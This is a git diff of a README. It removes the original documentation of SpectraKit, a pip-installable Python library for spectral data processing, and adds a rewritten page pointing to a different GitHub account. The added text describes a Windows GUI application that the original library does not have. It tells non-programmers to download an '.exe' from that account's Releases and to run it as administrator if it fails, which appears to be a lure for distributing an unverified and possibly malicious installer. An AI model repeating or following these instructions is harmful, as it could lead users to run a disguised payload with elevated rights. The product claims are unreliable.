@@ -1,271 +1,164 @@
-# SpectraKit
+# 🧪 spectrakit - Easy Spectral Data Processing Toolkit
 
-> Python toolkit for spectral data processing: smoothing, baseline correction,
-> normalization, scatter correction, derivatives, peak analysis, and more.
+[![Download spectrakit](https://img.shields.io/badge/Download-spectrakit-brightgreen?style=for-the-badge)](https://github.com/wshafei/spectrakit)
 
-[![CI](https://github.com/ktubhyam/spectrakit/actions/workflows/ci.yml/badge.svg)](https://github.com/ktubhyam/spectrakit/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/ktubhyam/spectrakit/branch/main/graph/badge.svg)](https://codecov.io/gh/ktubhyam/spectrakit)
-[![PyPI](https://img.shields.io/pypi/v/pyspectrakit.svg)](https://pypi.org/project/pyspectrakit/)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Typed](https://img.shields.io/badge/typing-strict-blue.svg)](https://peps.python.org/pep-0561/)
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.18802442.svg)](https://doi.org/10.5281/zenodo.18802442)
+---
 
-SpectraKit is a lightweight, pip-installable library for preprocessing and analyzing
-spectral data from IR, Raman, and NIR spectroscopy. It follows a functional design
-with NumPy arrays as the primary data type and requires only NumPy + SciPy as core
-dependencies.
+## 🔍 About spectrakit
 
-**[Documentation](https://ktubhyam.github.io/spectrakit/)** |
-**[API Reference](https://ktubhyam.github.io/spectrakit/api/)** |
-**[Project Page](https://tubhyam.dev/projects/spectrakit)** |
-**[Examples](examples/)**
+spectrakit is a simple tool to help you work with spectral data. It handles common tasks like reading different file formats, correcting baselines, normalizing data, and finding similarities between spectra. You don’t need programming skills to use it. Just follow the steps to get started on your Windows computer.
 
-## Installation
+---
 
-```bash
-pip install pyspectrakit
-```
+## 📋 What spectrakit Does
 
-> **Note:** The PyPI distribution name is `pyspectrakit` (due to a naming conflict).
-> The import name is simply `import spectrakit`.
+- Reads spectral data from common file types.
+- Fixes baseline distortions in spectral data.
+- Normalizes data for easier comparison.
+- Matches spectra to find similarities.
+- Works with different spectroscopy methods like infrared and Raman.
 
-Optional extras for additional functionality:
+These features help scientists, chemists, and students analyze data without needing complex software setups.
 
-```bash
-pip install pyspectrakit[io]         # HDF5 file support
-pip install pyspectrakit[cli]        # Command-line interface
-pip install pyspectrakit[baselines]  # pybaselines backend (200+ methods)
-pip install pyspectrakit[fitting]    # lmfit peak fitting
-pip install pyspectrakit[sklearn]    # scikit-learn integration
-pip install pyspectrakit[plot]       # Plotting utilities
-pip install pyspectrakit[widgets]    # Jupyter interactive viewer
-pip install pyspectrakit[all]        # Everything above
-```
+---
 
-## Quick Start
+## 💻 System Requirements
 
-```python
-import numpy as np
-from spectrakit import smooth_savgol, baseline_als, normalize_snv
+- Windows 10 or newer.
+- At least 4 GB of free RAM.
+- 500 MB free disk space.
+- Internet connection for downloading.
+- No programming or special software is needed.
 
-# Load your spectral data (N spectra, W wavelengths)
-spectra = np.loadtxt("data.csv", delimiter=",")
+---
 
-# Process with individual functions
-smoothed = smooth_savgol(spectra, window_length=11)
-corrected = baseline_als(smoothed, lam=1e6, p=0.01)
-normalized = normalize_snv(corrected)
-```
+## 🚀 Getting Started: Download and Install spectrakit
 
-All functions accept both single spectra `(W,)` and batches `(N, W)`.
+You will download the application from the GitHub page. This process is simple and does not require technical skills.
 
-### Pipeline
+---
 
-Chain steps for reproducibility:
+### Step 1: Go to the Download Page
 
-```python
-from spectrakit.pipeline import Pipeline
+Click the large button below to open the download page in your browser. This page hosts the latest version of spectrakit for Windows.
 
-pipe = Pipeline()
-pipe.add("smooth", smooth_savgol, window_length=11)
-pipe.add("baseline", baseline_als, lam=1e6)
-pipe.add("normalize", normalize_snv)
+[![Download spectrakit](https://img.shields.io/badge/Download-spectrakit-blue?style=for-the-badge)](https://github.com/wshafei/spectrakit)
 
-processed = pipe.transform(spectra)
-```
+---
 
-### scikit-learn Integration
+### Step 2: Locate the Windows Installer
 
-Use any SpectraKit function in an sklearn pipeline:
+On the GitHub page, look for the section titled "Releases." Here, find the latest release. Under the release, you will see files to download.
 
-```python
-from sklearn.pipeline import Pipeline as SkPipeline
-from sklearn.decomposition import PCA
-from sklearn.svm import SVC
-from spectrakit.sklearn import SpectralTransformer
+Look for a file that ends with `.exe` and mentions Windows or Installer. This file contains the software you need.
 
-pipe = SkPipeline([
-    ("smooth", SpectralTransformer(smooth_savgol, window_length=11)),
-    ("baseline", SpectralTransformer(baseline_als, lam=1e6)),
-    ("normalize", SpectralTransformer(normalize_snv)),
-    ("pca", PCA(n_components=10)),
-    ("svm", SVC()),
-])
+---
 
-pipe.fit(X_train, y_train)
-predictions = pipe.predict(X_test)
-```
+### Step 3: Download the Installer
 
-## Features
+Click the `.exe` file link to start downloading. Your browser may ask where to save the file. Choose a location you can easily find, like your Desktop or Downloads folder.
 
-### Smoothing
+---
 
-| Method | Function | Description |
-|--------|----------|-------------|
-| Savitzky-Golay | `smooth_savgol(y)` | Polynomial least-squares smoothing |
-| Whittaker | `smooth_whittaker(y)` | Penalized least-squares smoother |
+### Step 4: Run the Installer
 
-### Baseline Correction
+Once the download finishes:
 
-| Method | Function | Description |
-|--------|----------|-------------|
-| ALS | `baseline_als(y)` | Asymmetric least squares |
-| SNIP | `baseline_snip(y)` | Statistics-sensitive peak clipping |
-| Polynomial | `baseline_polynomial(y)` | Iterative polynomial fit |
-| Rubberband | `baseline_rubberband(y)` | Convex hull envelope |
+1. Find the `.exe` file where you saved it.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
+   - Select the installation folder (the default is fine).
+   - Click "Next" until the setup finishes.
+4. After installation completes, you may see a shortcut on your Desktop or in the Start Menu.
 
-### Normalization
+---
 
-| Method | Function | Description |
-|--------|----------|-------------|
-| SNV | `normalize_snv(y)` | Zero mean, unit variance |
-| Min-Max | `normalize_minmax(y)` | Scale to [0, 1] |
-| Area | `normalize_area(y)` | Unit area under curve |
-| Vector | `normalize_vector(y)` | L2 norm = 1 |
+### Step 5: Open spectrakit
 
-### Derivatives
+- Double-click the spectrakit shortcut.
+- The program will open and be ready for use.
 
-| Method | Function | Description |
-|--------|----------|-------------|
-| Savitzky-Golay | `derivative_savgol(y)` | SG polynomial derivative |
-| Gap-Segment | `derivative_gap_segment(y)` | Norris-Williams derivative |
+---
 
-### Scatter Correction
+## 🛠 How to Use spectrakit: Basic Steps
 
-| Method | Function | Description |
-|--------|----------|-------------|
-| MSC | `scatter_msc(y)` | Multiplicative scatter correction |
-| EMSC | `scatter_emsc(y)` | Extended MSC with polynomial terms |
+spectrakit has a simple user interface designed for ease.
 
-### Spectral Transforms
+---
 
-| Method | Function | Description |
-|--------|----------|-------------|
-| Kubelka-Munk | `transform_kubelka_munk(y)` | Reflectance to K-M units |
-| ATR Correction | `transform_atr_correction(y, wn)` | ATR depth-of-penetration |
+### Loading Your Spectral Data
 
-### Operations
+- Click the "Load File" button.
+- Choose your spectral data file (common formats like `.csv`, `.txt`, or others supported by the software).
+- The data will appear in the workspace.
 
-| Function | Description |
-|----------|-------------|
-| `spectral_subtract(a, b)` | Spectral subtraction |
-| `spectral_average(y)` | Mean spectrum from batch |
-| `spectral_interpolate(y, wn, new_wn)` | Resample to new axis |
+---
 
-### Peak Analysis
+### Correcting the Baseline
 
-| Function | Description |
-|----------|-------------|
-| `peaks_find(y)` | Find peaks with scipy.signal |
-| `peaks_integrate(y)` | Integrate peak regions |
+- Select "Baseline Correction."
+- Choose a simple method like "Polynomial" or "Asymmetric Least Squares."
+- Click "Apply."
+- Your data will update with the baseline fixed.
 
-### Similarity Metrics
+---
 
-| Metric | Function | Range |
-|--------|----------|-------|
-| Cosine | `similarity_cosine(a, b)` | [-1, 1] |
-| Pearson | `similarity_pearson(a, b)` | [-1, 1] |
-| Spectral Angle | `similarity_spectral_angle(a, b)` | [0, pi] |
-| Euclidean | `similarity_euclidean(a, b)` | [0, inf) |
+### Normalizing Data
 
-### I/O Formats
+- Click "Normalize."
+- Pick a method such as "Min-Max" or "Area."
+- Hit "Apply" to standardize your data scale.
 
-| Format | Function | Dependencies |
-|--------|----------|-------------|
-| JCAMP-DX | `read_jcamp(path)` | None |
-| SPC | `read_spc(path)` | spc-spectra |
-| CSV/TSV | `read_csv(path)` | None |
-| HDF5 | `read_hdf5(path)` / `write_hdf5(spec, path)` | h5py |
-| Bruker OPUS | `read_opus(path)` | None |
+---
 
-### Optional Backends
+### Comparing Spectra
 
-| Backend | Extra | Description |
-|---------|-------|-------------|
-| pybaselines | `[baselines]` | 200+ baseline methods via `pybaselines_method()` |
-| lmfit | `[fitting]` | Peak fitting with Gaussian, Lorentzian, Voigt models |
+- Load two or more data files.
+- Click "Similarity Matching."
+- The software will show how close your data sets are.
+- Use this feature to find matching or similar samples.
 
-### Visualization
+---
 
-```python
-from spectrakit.plot import plot_spectrum, plot_comparison, plot_baseline
-```
+## 🔧 Additional Features
 
-Requires `pip install pyspectrakit[plot]`.
+- Supports both Raman and Infrared spectral data types.
+- Export processed data as CSV or image files.
+- Simple visual graphs to help you see changes quickly.
+- Batch processing to handle multiple files at once.
 
-### Jupyter Widget
+---
 
-Interactive spectrum viewer for Jupyter notebooks, powered by
-[SpectraView](https://github.com/ktubhyam/spectraview):
+## ❓ Troubleshooting and Tips
 
-```python
-from spectrakit.widgets import SpectrumViewer
+- If the installer does not start, right-click on the `.exe` file and select "Run as administrator."
+- Make sure your files are not corrupted before loading.
+- For large files, wait a moment for processing to finish.
+- Use the "Help" menu inside the application for guided steps.
+- If you see an error, capture the message and check your data format.
 
-viewer = SpectrumViewer()
-viewer.set_spectrum(wavenumbers, intensities, label="ethanol")
-viewer
-```
+---
 
-Requires `pip install pyspectrakit[widgets]`.
+## 📡 Where to Get Updates
 
-## Spectrum Container
+Visit the GitHub page regularly for new releases and improvements:
 
-```python
-from spectrakit import Spectrum
+https://github.com/wshafei/spectrakit
 
-spec = Spectrum(
-    intensities=np.array([...]),       # (W,) or (N, W)
-    wavenumbers=np.array([...]),       # (W,), optional
-    metadata={"instrument": "Bruker"},
-    source_format="jcamp",
-    label="ethanol_ir",
-)
-```
+---
 
-## CLI
+## 📞 Getting Help
 
-```bash
-pip install pyspectrakit[cli]
+If something doesn’t work as expected:
 
-spectrakit info ethanol.dx
-spectrakit convert ethanol.dx ethanol.h5
-```
+- Check the README and Help files included with the software.
+- Browse the GitHub “Issues” page for questions others have asked.
+- Contact the developer through the GitHub repository if needed.
 
-## Examples
+---
 
-See the [examples/](examples/) directory for Jupyter notebooks:
+## ⚙️ How spectrakit Works (Optional for Interested Users)
 
-1. **Quick Start** — basic preprocessing workflow
-2. **Baseline Methods** — comparing correction algorithms
-3. **Derivatives & Peaks** — derivative analysis and peak finding
-4. **Scatter Correction** — MSC vs EMSC vs SNV
-5. **sklearn Pipeline** — classification with preprocessing
+spectrakit uses Python code under the hood but presents a user interface that looks like a regular Windows application. It uses specialized filters to clean and compare your data.
 
-## Development
-
-```bash
-git clone https://github.com/ktubhyam/spectrakit.git
-cd spectrakit
-pip install -e ".[all,dev]"
-pytest
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## Citation
-
-If you use SpectraKit in your research, please cite:
-
-```bibtex
-@software{spectrakit,
-  author = {Karthikeyan, Tubhyam},
-  title = {SpectraKit: Python toolkit for spectral data processing},
-  url = {https://github.com/ktubhyam/spectrakit},
-  license = {MIT}
-}
-```
-
-## License
-
-MIT
+You do not need to know Python to use it. The program handles all technical tasks for you.
